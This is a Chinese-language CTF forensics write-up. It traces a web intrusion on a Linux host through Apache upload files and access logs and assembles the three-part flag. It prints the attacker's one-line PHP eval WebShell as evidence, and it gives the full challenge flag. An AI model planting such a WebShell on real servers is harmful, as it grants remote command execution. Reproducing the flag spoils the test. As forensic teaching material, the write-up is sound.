# Computer cleaner

## 题目简述

题目提供一台遭到 Web 入侵的 Linux 主机，需要沿 Apache 站点文件和访问日志还原攻击过程，并从攻击者留下的 WebShell、攻击源站点与本地文件中拼出三段 flag。决定解法的是对既有主机证据的恢复与关联，因此归入 `forensics`。

## 解题过程

Apache 默认站点位于 `/var/www/html`。进入该目录后检查上传目录，可以发现异常文件 `uploads/shell.php`：

```bash
cd /var/www/html
ls
ls uploads
cat uploads/shell.php
```

WebShell 把第一段 flag 当作 `POST` 参数名：

```php
<?php @eval($_POST['hgame{y0u_']); ?>
```

接着检查站点中的 `upload_log.txt`，筛选访问该 WebShell 的请求：

```bash
grep -F 'shell.php' upload_log.txt
```

日志显示同一外部来源先上传并访问 `shell.php`，随后通过 `cmd` 参数执行命令，还请求了 `~/Documents/flag_part3`。记录中的来源地址不是题目靶机地址，而是下一条证据的落点；直接在浏览器访问该来源主机，页面返回第二段：

```text
hav3_cleaned_th3
```

最后按日志暴露的路径读取本机文件：

```bash
cat ~/Documents/flag_part3
```

得到第三段：

```text
c0mput3r!}
```

三段按证据链出现的顺序拼接，最终为：

```text
hgame{y0u_hav3_cleaned_th3_c0mput3r!}
```

## 方法总结

- 核心技巧：从 Web 根目录定位恶意上传文件，以 WebShell 内容、HTTP 访问日志和攻击者访问目标串联主机入侵证据。
- 识别信号：站点上传目录出现短小 `eval($_POST[...])` 文件，日志又记录对同一路径的上传、访问和命令参数时，应把参数名、来源地址和命令目标都视为可能的取证线索。
- 复用要点：应按“落地文件 → 日志中的来源与请求 → 被访问的本地路径”建立证据链；不要只删除 WebShell，也不要把临时 IP 写进长期 WP，保留其在链条中的语义即可。
